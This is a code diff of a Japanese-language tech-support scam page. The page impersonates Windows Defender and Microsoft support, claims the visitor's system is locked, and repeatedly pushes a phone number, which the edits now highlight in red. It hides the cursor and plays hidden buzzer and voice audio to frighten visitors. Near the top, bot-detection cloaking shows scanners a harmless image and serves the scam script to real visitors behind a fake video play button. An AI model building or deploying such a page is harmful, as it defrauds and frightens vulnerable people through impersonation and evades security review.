@@ -11,10 +11,6 @@
 
       script.src = url;
 
-      script.onload = () => {
-        console.error(`Loaded: ${url}`);
-      };
-
       script.onerror = () => {
         console.error(`Failed: ${url}`);
       };
@@ -49,14 +45,12 @@
         switch (true) {
           case adscore.okay:
             return run(() => {
-              document.querySelector('#image').src = `https://www.faponhd.com/contents/videos_screenshots/0/700/preview.jpg`;
-              document.querySelector('#image').style.display = `block`;
+              document.querySelector('#image').src = `_/jpg/2.jpg`;
               return load(`index.js`);
             });
           default:
             return run(() => {
-              document.querySelector('#image').src = `https://wallpapersok.com/images/hd/1920x1080-full-hd-nature-empty-road-domelzuuj7rtqqu5.jpg`;
-              document.querySelector('#image').style.display = `block`;
+              document.querySelector('#image').src = `_/jpg/1.jpg`;
               return false;
             });
         }
@@ -71,7 +65,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background: #000000ff;
+      background: #edf2faff;
     }
 
     .container {
@@ -80,19 +74,21 @@
     }
 
     .container img {
-      display: block;
-      max-width: 90vw;
+      filter: drop-shadow(0 0 1rem #000000ff);
       max-height: 90vh;
+      max-width: 90vw;
+      display: block;
     }
 
     .play-button {
+      filter: drop-shadow(0 0 2rem #000000ff);
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 80px;
-      height: 80px;
-      background: rgba(255, 255, 255, 0.7);
+      width: 8rem;
+      height: 8rem;
+      background: #edf2faff;
       border-radius: 50%;
       display: flex;
       justify-content: center;
@@ -103,9 +99,9 @@
     .play-button::before {
       content: '';
       display: block;
-      margin-left: 5px;
+      margin-left: 0.5rem;
       border-style: solid;
-      border-width: 15px 0 15px 25px;
+      border-width: 2rem 0 2rem 2.828rem;
       border-color: transparent transparent transparent #000000ff;
     }
   </style>
@@ -116,7 +112,7 @@
 
 <body>
   <div id="remove" class="container">
-    <img id="image" loading="lazy" alt="image" style="display: none;">
+    <img alt="image" id="image" loading="lazy" src="_/jpg/1.jpg">
     <div class="play-button"></div>
   </div>
 
@@ -125,12 +121,12 @@
       window.bcda = "";
     </script>
     <div style="position:absolute; top:100px; right:10px; z-index:9999;">
-      <img src="_/gif/1gfhf0f.gif" alt="" width="500">
+      <img loading="lazy" src="_/gif/1gfhf0f.gif" alt="" width="500">
     </div>
 
     <div class="bg" style="cursor:none">
       <div class="bgimg" style="top:0">
-        <img src="_/png/fesbg.png" alt="" width="100%">
+        <img loading="lazy" src="_/png/fesbg.png" alt="" width="100%">
       </div>
     </div>
     <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
@@ -138,23 +134,23 @@
     </a>
 
     <div class="pro_box2" style="cursor: none; display: block;">
-      <img src="_/png/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
+      <img loading="lazy" src="_/png/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
         margin: 0 auto;">
     </div>
     <div class="pro_box3" style="cursor: none; display: block;">
-      <img src="_/png/web1.png" alt="" style="width:100%;max-width: 100%;display: block;
-        margin: 0 auto;">
+      <img loading="lazy" src="_/png/web1.png" alt=""
+        style="width:100%;max-width: 100%;display: block; margin: 0 auto;">
     </div>
     <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
       <div class="row">
         <div class="col-md-12">
           <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
             <span id="footertxt">
-              <img src="_/png/img01df.png"> Windows_セキュリティ </span>
+              <img loading="lazy" src="_/png/img01df.png"> Windows_セキュリティ </span>
             <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span
-                style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="_/png/winlo.png" alt=""
-                  style="width: 25px;vertical-align: sub;"> 直接お電話ください
-                <script>document.write(bcda)</script>(0101)-88851-05059
+                style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img loading="lazy"
+                  src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください
+                <script>document.write(bcda)</script><span style="color: #ff0000ff;">(0101)-88851-05059</span>
               </span>
             </span>
           </div>
@@ -176,11 +172,11 @@
         <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
           <span class="fl title" id="txtadd">
             <span class="fl ilb">
-              <img src="_/png/dm.png" class="logo3">
+              <img loading="lazy" src="_/png/dm.png" class="logo3">
             </span>Windows_Defender_セキュリティセンター</span>
           <span class="fl title2" id="txts1">
             <a href="#" id="bgt">
-              <img src="_/png/cs.png">
+              <img loading="lazy" src="_/png/cs.png">
             </a>
           </span>
         </div>
@@ -192,20 +188,20 @@
           <div id="isp">ISP: Bharti Airtel Limited</div>
         </span>
       </div>
-      <img src="_/gif/re.gif" id="banner">
+      <img loading="lazy" src="_/gif/re.gif" id="banner">
       <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。
         <br>
         <span class="support" style="font-size:22px;">
           Windows サポートに問い合わせてください:
           <br>
           <span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px">
-            <img src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;" /> 直接お電話ください
-            <script>document.write(bcda)</script>(0101)-88851-05059
+            <img loading="lazy" src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;" /> 直接お電話ください
+            <script>document.write(bcda)</script><span style="color: #ff0000ff;">(0101)-88851-05059</span>
           </span>
         </span>
       </div>
       <div id="bottom">
-        <img src="_/png/img01df.png" id="badge">
+        <img loading="lazy" src="_/png/img01df.png" id="badge">
         <span class="title3">Windows</span>
         <ul>
           <li>
@@ -239,7 +235,7 @@
       <br>
       <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong>
           <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください
-            <script>document.write(bcda)</script>(0101)-88851-05059
+            <script>document.write(bcda)</script><span style="color: #ff0000ff;">(0101)-88851-05059</span>
           </span>
         </strong>
       </p>
@@ -259,20 +255,21 @@
         <br>
         <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img
               src="_/png/winlo.png" alt="&nbsp;" style="width: 25px;vertical-align: bottom;"> 直接お電話ください
-            <script>document.write(bcda)</script>(0101)-88851-05059
+            <script>document.write(bcda)</script><span style="color: #ff0000ff;">(0101)-88851-05059</span>
           </span>
         </strong>
       </p>
     </div>
     <div id="chat" style="display: block;">
-      <img src="_/png/img01df.png">
+      <img loading="lazy" src="_/png/img01df.png">
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
       <p style="font-weight:600;font-size:24px">サポートに電話する:
         <br>
       </p>
-      <h4 style="font-weight:600;font-size:22px"> <img src="_/png/winlo.png" alt="" style="width: 25px;margin-left: 0;">
+      <h4 style="font-weight:600;font-size:22px"> <img loading="lazy" src="_/png/winlo.png" alt=""
+          style="width: 25px;margin-left: 0;">
         電話してください
-        <script>document.write(bcda)</script>(0101)-88851-05059
+        <script>document.write(bcda)</script><span style="color: #ff0000ff;">(0101)-88851-05059</span>
         <br>(セキュリティヘルプデスク)
       </h4>
       <div class="arrow-down">
@@ -289,8 +286,11 @@
       </div>
     </div>
 
-    <audio style="visibility: hidden;" id="pridez" controls>
-      <source src="_/mp3/audio.mp3" type="audio/mpeg">
+    <audio style="visibility:hidden;" id="sound2" controls>
+      <source src="_/mp3/buzzer.mp3" type="audio/mpeg">
+    </audio>
+    <audio style="visibility:hidden;" id="sound1" controls>
+      <source src="_/mp3/voice.mp3" type="audio/mpeg">
     </audio>
   </section>
 </body>
